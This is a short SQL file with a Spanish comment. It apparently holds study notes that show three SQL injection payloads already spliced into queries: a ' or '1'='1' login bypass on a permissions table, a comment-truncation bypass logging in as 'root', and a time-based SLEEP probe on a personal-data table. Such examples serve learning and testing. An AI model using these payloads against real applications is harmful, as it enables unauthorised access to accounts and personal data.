-- conusltas sql 

SELECT * FROM permisos WHERE Usuario = '' or '1'='1' AND Contrasena = '' OR '1'='1';

SELECT * FROM permisos WHERE Usuario = 'root'; -- ' AND password = 'mypassword';

SELECT * FROM datospersonales WHERE id=1-SLEEP(1);